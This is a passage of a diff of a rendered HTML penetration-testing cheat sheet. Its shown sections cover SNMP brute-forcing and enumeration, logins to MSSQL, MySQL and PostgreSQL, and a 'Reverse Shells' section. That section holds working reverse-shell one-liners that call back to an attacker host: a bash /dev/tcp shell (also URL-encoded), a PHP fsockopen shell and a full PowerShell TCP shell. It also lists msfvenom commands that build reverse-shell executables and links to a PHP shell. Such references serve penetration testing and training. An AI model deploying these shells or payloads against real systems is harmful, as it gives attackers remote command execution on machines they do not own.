+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>--open<span class="w"> </span>-p<span class="w"> </span>IP<span class="w"> </span>-oG<span class="w"> </span>open-snmp.txt
 </span></code></pre></div>
 <h5 id="onesixtyone">onesixtyone<a class="headerlink" href="#onesixtyone" title="Permanent link">¶</a></h5>
 <p>SNMP brute force scanner.</p>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="nb">echo</span><span class="w"> </span>public<span class="w"> </span>&gt;<span class="w"> </span>community
-</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="nb">echo</span><span class="w"> </span>private<span class="w"> </span>&gt;&gt;<span class="w"> </span>community
-</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="nb">echo</span><span class="w"> </span>manager<span class="w"> </span>&gt;&gt;<span class="w"> </span>community
-</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">254</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="m">192</span>.168.0.<span class="nv">$ip</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span>&gt;<span class="w"> </span>ips
-</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>onesixtyone<span class="w"> </span>-c<span class="w"> </span>community<span class="w"> </span>-i<span class="w"> </span>ips
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="nb">echo</span><span class="w"> </span>public<span class="w"> </span>&gt;<span class="w"> </span>community
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="nb">echo</span><span class="w"> </span>private<span class="w"> </span>&gt;&gt;<span class="w"> </span>community
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="nb">echo</span><span class="w"> </span>manager<span class="w"> </span>&gt;&gt;<span class="w"> </span>community
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">254</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="m">192</span>.168.0.<span class="nv">$ip</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span>&gt;<span class="w"> </span>ips
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>onesixtyone<span class="w"> </span>-c<span class="w"> </span>community<span class="w"> </span>-i<span class="w"> </span>ips
 </span></code></pre></div>
 <h5 id="snmpwalk">snmpwalk<a class="headerlink" href="#snmpwalk" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="c1"># With hex decode, timeout 10 sec</span>
-</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span><span class="w"> </span>IP<span class="w"> </span>-Oa
-</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>
-</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="c1"># Enumerate Windows users on dc</span>
-</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span>IP<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.77.1.2.25
-</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>
-</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a><span class="c1"># Enumerate running processes</span>
-</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span>IP<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2
-</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>-p<span class="w"> </span><span class="m">161</span><span class="w"> </span>--script<span class="o">=</span>snmp-processes<span class="w"> </span>&lt;target&gt;
-</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a>
-</span><span id="__span-53-11"><a id="__codelineno-53-11" name="__codelineno-53-11" href="#__codelineno-53-11"></a><span class="c1"># Enumerate installed software</span>
-</span><span id="__span-53-12"><a id="__codelineno-53-12" name="__codelineno-53-12" href="#__codelineno-53-12"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span>IP<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2
-</span><span id="__span-53-13"><a id="__codelineno-53-13" name="__codelineno-53-13" href="#__codelineno-53-13"></a>
-</span><span id="__span-53-14"><a id="__codelineno-53-14" name="__codelineno-53-14" href="#__codelineno-53-14"></a><span class="c1"># Enumerate TCP listening ports</span>
-</span><span id="__span-53-15"><a id="__codelineno-53-15" name="__codelineno-53-15" href="#__codelineno-53-15"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span>IP<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.6.13.1.3
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="c1"># With hex decode, timeout 10 sec</span>
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span><span class="w"> </span>IP<span class="w"> </span>-Oa
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="c1"># Enumerate Windows users on dc</span>
+</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span>IP<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.77.1.2.25
+</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>
+</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a><span class="c1"># Enumerate running processes</span>
+</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span>IP<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2
+</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>-p<span class="w"> </span><span class="m">161</span><span class="w"> </span>--script<span class="o">=</span>snmp-processes<span class="w"> </span>&lt;target&gt;
+</span><span id="__span-54-10"><a id="__codelineno-54-10" name="__codelineno-54-10" href="#__codelineno-54-10"></a>
+</span><span id="__span-54-11"><a id="__codelineno-54-11" name="__codelineno-54-11" href="#__codelineno-54-11"></a><span class="c1"># Enumerate installed software</span>
+</span><span id="__span-54-12"><a id="__codelineno-54-12" name="__codelineno-54-12" href="#__codelineno-54-12"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span>IP<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2
+</span><span id="__span-54-13"><a id="__codelineno-54-13" name="__codelineno-54-13" href="#__codelineno-54-13"></a>
+</span><span id="__span-54-14"><a id="__codelineno-54-14" name="__codelineno-54-14" href="#__codelineno-54-14"></a><span class="c1"># Enumerate TCP listening ports</span>
+</span><span id="__span-54-15"><a id="__codelineno-54-15" name="__codelineno-54-15" href="#__codelineno-54-15"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span>IP<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.6.13.1.3
 </span></code></pre></div>
 <h4 id="databases">Databases<a class="headerlink" href="#databases" title="Permanent link">¶</a></h4>
 <h5 id="mssql-tcp-1433">MSSQL (TCP: 1433)<a class="headerlink" href="#mssql-tcp-1433" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="c1"># MSSQL login</span>
-</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>impacket-mssqlclient<span class="w"> </span>USER:PASS@IP<span class="w"> </span>-windows-auth
-</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>
-</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="c1"># Check version</span>
-</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>SELECT<span class="w"> </span>@@version<span class="p">;</span>
-</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a><span class="c1"># List DBs. Defaults are: master, tempdb, model, and msdb</span>
-</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>SELECT<span class="w"> </span>name<span class="w"> </span>FROM<span class="w"> </span>sys.databases<span class="p">;</span>
-</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a><span class="c1"># List tables in DB</span>
-</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a>SELECT<span class="w"> </span>*<span class="w"> </span>FROM<span class="w"> </span>offsec.information_schema.tables<span class="p">;</span>
-</span></code></pre></div>
-<h5 id="mysql-tcp-3306">MySQL (TCP: 3306)<a class="headerlink" href="#mysql-tcp-3306" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="c1"># MySQL login</span>
-</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>mysql<span class="w"> </span>-u<span class="w"> </span>USER<span class="w"> </span>-p<span class="s1">'PASS'</span><span class="w"> </span>-h<span class="w"> </span>IP<span class="w"> </span>-P<span class="w"> </span>PORT<span class="w"> </span>--skip-ssl-verify-server-cert
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="c1"># MSSQL login</span>
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>impacket-mssqlclient<span class="w"> </span>USER:PASS@IP<span class="w"> </span>-windows-auth
 </span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>
 </span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="c1"># Check version</span>
-</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="k">select</span><span class="w"> </span>version<span class="o">()</span><span class="p">;</span>
-</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="c1"># Current user</span>
-</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="k">select</span><span class="w"> </span>system_user<span class="o">()</span><span class="p">;</span>
-</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="c1"># List DBs</span>
-</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a>show<span class="w"> </span>databases<span class="p">;</span>
-</span><span id="__span-55-10"><a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a><span class="c1"># List tables in DB</span>
-</span><span id="__span-55-11"><a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a>show<span class="w"> </span>tables<span class="w"> </span>from<span class="w"> </span>DBNAME<span class="p">;</span>
+</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>SELECT<span class="w"> </span>@@version<span class="p">;</span>
+</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="c1"># List DBs. Defaults are: master, tempdb, model, and msdb</span>
+</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a>SELECT<span class="w"> </span>name<span class="w"> </span>FROM<span class="w"> </span>sys.databases<span class="p">;</span>
+</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="c1"># List tables in DB</span>
+</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a>SELECT<span class="w"> </span>*<span class="w"> </span>FROM<span class="w"> </span>offsec.information_schema.tables<span class="p">;</span>
+</span></code></pre></div>
+<h5 id="mysql-tcp-3306">MySQL (TCP: 3306)<a class="headerlink" href="#mysql-tcp-3306" title="Permanent link">¶</a></h5>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="c1"># MySQL login</span>
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>mysql<span class="w"> </span>-u<span class="w"> </span>USER<span class="w"> </span>-p<span class="s1">'PASS'</span><span class="w"> </span>-h<span class="w"> </span>IP<span class="w"> </span>-P<span class="w"> </span>PORT<span class="w"> </span>--skip-ssl-verify-server-cert
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="c1"># Check version</span>
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="k">select</span><span class="w"> </span>version<span class="o">()</span><span class="p">;</span>
+</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a><span class="c1"># Current user</span>
+</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="k">select</span><span class="w"> </span>system_user<span class="o">()</span><span class="p">;</span>
+</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a><span class="c1"># List DBs</span>
+</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a>show<span class="w"> </span>databases<span class="p">;</span>
+</span><span id="__span-56-10"><a id="__codelineno-56-10" name="__codelineno-56-10" href="#__codelineno-56-10"></a><span class="c1"># List tables in DB</span>
+</span><span id="__span-56-11"><a id="__codelineno-56-11" name="__codelineno-56-11" href="#__codelineno-56-11"></a>show<span class="w"> </span>tables<span class="w"> </span>from<span class="w"> </span>DBNAME<span class="p">;</span>
 </span></code></pre></div>
 <h5 id="postgresql-tcp-5432">PostgreSQL (TCP: 5432)<a class="headerlink" href="#postgresql-tcp-5432" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="c1"># PostgreSQL login</span>
-</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>psql<span class="w"> </span>-h<span class="w"> </span>IP<span class="w"> </span>-p<span class="w"> </span>2PORT5<span class="w"> </span>-U<span class="w"> </span>USER
-</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>
-</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="c1"># List DBs</span>
-</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="se">\l</span>
-</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a><span class="c1"># Connect to DB</span>
-</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="se">\c</span><span class="w"> </span>DB_NAME
-</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a><span class="c1"># List tables in DB</span>
-</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a><span class="k">select</span><span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>DB_NAME<span class="p">;</span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="c1"># PostgreSQL login</span>
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>psql<span class="w"> </span>-h<span class="w"> </span>IP<span class="w"> </span>-p<span class="w"> </span>2PORT5<span class="w"> </span>-U<span class="w"> </span>USER
+</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>
+</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="c1"># List DBs</span>
+</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="se">\l</span>
+</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a><span class="c1"># Connect to DB</span>
+</span><span id="__span-57-7"><a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a><span class="se">\c</span><span class="w"> </span>DB_NAME
+</span><span id="__span-57-8"><a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a><span class="c1"># List tables in DB</span>
+</span><span id="__span-57-9"><a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a><span class="k">select</span><span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>DB_NAME<span class="p">;</span>
 </span></code></pre></div>
 <h3 id="reverse-shells">Reverse Shells<a class="headerlink" href="#reverse-shells" title="Permanent link">¶</a></h3>
-<p><a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary">https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary</a></p>
+<p><a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary">https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary</a>
+<a href="https://github.com/ivan-sincek/php-reverse-shell/">Linux and Windows PHP shell</a></p>
 <p><a href="https://www.revshells.com/">https://www.revshells.com/</a></p>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="c1"># Check current shell</span>
-</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>ps<span class="w"> </span>-p<span class="w"> </span><span class="nv">$$</span>
-</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>
-</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="c1"># Kali directory webshells</span>
-</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a>/usr/share/webshells/
-</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a>
-</span><span id="__span-57-7"><a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a><span class="c1"># Bash</span>
-</span><span id="__span-57-8"><a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/IP/PORT<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
-</span><span id="__span-57-9"><a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a><span class="c1"># Bash (URL encoded)</span>
-</span><span id="__span-57-10"><a id="__codelineno-57-10" name="__codelineno-57-10" href="#__codelineno-57-10"></a>bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
-</span><span id="__span-57-11"><a id="__codelineno-57-11" name="__codelineno-57-11" href="#__codelineno-57-11"></a><span class="c1"># Bash, in case of sh</span>
-</span><span id="__span-57-12"><a id="__codelineno-57-12" name="__codelineno-57-12" href="#__codelineno-57-12"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1"</span>
-</span><span id="__span-57-13"><a id="__codelineno-57-13" name="__codelineno-57-13" href="#__codelineno-57-13"></a><span class="c1"># PHP</span>
-</span><span id="__span-57-14"><a id="__codelineno-57-14" name="__codelineno-57-14" href="#__codelineno-57-14"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">'$sock=fsockopen("IP",PORT);exec("/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
-</span><span id="__span-57-15"><a id="__codelineno-57-15" name="__codelineno-57-15" href="#__codelineno-57-15"></a><span class="c1"># Powershell one liner</span>
-</span><span id="__span-57-16"><a id="__codelineno-57-16" name="__codelineno-57-16" href="#__codelineno-57-16"></a><span class="c1"># https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 </span>
-</span><span id="__span-57-17"><a id="__codelineno-57-17" name="__codelineno-57-17" href="#__codelineno-57-17"></a><span class="c1"># in base of Base64, make sure to encode as UTF16 first</span>
-</span><span id="__span-57-18"><a id="__codelineno-57-18" name="__codelineno-57-18" href="#__codelineno-57-18"></a><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'10.10.10.10'</span>,80<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>..65535<span class="p">|</span>%<span class="o">{</span><span class="m">0</span><span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>,<span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="nv">$bytes</span>.Length<span class="o">))</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="o">){</span><span class="p">;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>-TypeName<span class="w"> </span>System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0,<span class="w"> </span><span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>iex<span class="w"> </span><span class="s2">". { </span><span class="nv">$data</span><span class="s2"> } 2&gt;&amp;1"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Out-String<span class="w"> </span><span class="o">)</span><span class="p">;</span><span class="w"> </span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span>+<span class="w"> </span><span class="s1">'PS '</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path<span class="w"> </span>+<span class="w"> </span><span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
-</span><span id="__span-57-19"><a id="__codelineno-57-19" name="__codelineno-57-19" href="#__codelineno-57-19"></a>
-</span><span id="__span-57-20"><a id="__codelineno-57-20" name="__codelineno-57-20" href="#__codelineno-57-20"></a><span class="c1"># Python file hosting</span>
-</span><span id="__span-57-21"><a id="__codelineno-57-21" name="__codelineno-57-21" href="#__codelineno-57-21"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
-</span><span id="__span-57-22"><a id="__codelineno-57-22" name="__codelineno-57-22" href="#__codelineno-57-22"></a>
-</span><span id="__span-57-23"><a id="__codelineno-57-23" name="__codelineno-57-23" href="#__codelineno-57-23"></a><span class="c1"># Create payloads with msfvenom</span>
-</span><span id="__span-57-24"><a id="__codelineno-57-24" name="__codelineno-57-24" href="#__codelineno-57-24"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>reverse.exe
-</span><span id="__span-57-25"><a id="__codelineno-57-25" name="__codelineno-57-25" href="#__codelineno-57-25"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>shell
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="c1"># Check current shell</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>ps<span class="w"> </span>-p<span class="w"> </span><span class="nv">$$</span>
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="c1"># Kali directory webshells</span>
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>/usr/share/webshells/
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>
+</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="c1"># Bash</span>
